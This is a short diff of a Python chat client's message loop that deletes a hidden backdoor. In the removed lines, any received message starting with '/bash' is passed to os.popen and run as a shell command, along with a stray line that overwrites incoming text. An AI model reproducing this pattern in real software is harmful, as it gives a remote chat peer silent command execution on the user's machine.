@@ -44,10 +44,6 @@ else:
     while True:
         print(name2 + ": ", end='')
         a = recv()
-        if a[:5] == '/bash':
-            import os
-            os.popen(a[6:])
-        a = 'Ыы'
         if a == '':
             print("Diskonnected")
             exit(0)
